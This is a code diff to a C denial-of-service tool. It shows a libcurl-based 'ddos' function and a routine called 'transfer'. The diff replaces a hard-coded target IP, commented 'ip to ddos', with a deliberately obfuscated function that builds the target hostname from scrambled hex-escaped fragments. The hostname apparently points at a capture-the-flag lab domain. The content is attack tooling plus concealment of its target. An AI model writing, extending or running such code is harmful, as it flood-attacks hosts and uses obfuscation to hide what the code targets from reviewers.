@@ -86,10 +86,6 @@ void transfer() {
     fclose(file);
 }
 
-
-
-
-
 void ddos(const char *hostname, int index, int total) {
     CURL *curl = curl_easy_init();
     CURLcode resolution;
@@ -119,13 +115,42 @@ void ddos(const char *hostname, int index, int total) {
     fflush(stdout);
 }
 
+char* the_0bfusk1_666_h0sTn4m3() {
+    char nbmpdibqer[] = "\x6C\x6D";
+    char msdopzoinf[] = "\x6E\x61";
+    char odbazmapwn[] = "\x2E\x63\x74\x66";
+    char fjdoznvpzq[] = "\x68\x65";
+    char vaedcvegvd[] = "\x73\x74";
+    char foazuibcvi[] = "\x6C\x6C\x75\x78";
+    char yzebxcpsuz[] = "\x61\x64";
+    char nciuazbcvo[] = "\x68\x61";
+    
+    char combined[64];
+    
+    if (combined) {
+	    strcpy(combined, fjdoznvpzq);
+	    strcat(combined, msdopzoinf);
+	    strcat(combined, foazuibcvi);
+	    strcat(combined, nciuazbcvo);
+	    strcat(combined, nbmpdibqer);
+	    strcat(combined, vaedcvegvd);
+	    strcat(combined, yzebxcpsuz);
+	    strcat(combined, odbazmapwn);
+    }
+    
+    return strdup(combined);
+}
+
 int main(void) {
 
     transfer();
     struct addrinfo hints;
     struct addrinfo *result;
+    char combined[64];
 
-    const char *hostname = "192.168.0.1"; //ip to ddos
+    const char* hostname = the_0bfusk1_666_h0sTn4m3(); //ip to ddos
+    
+    printf("Hostname : %s", hostname);
 
     displayTextArt();
 
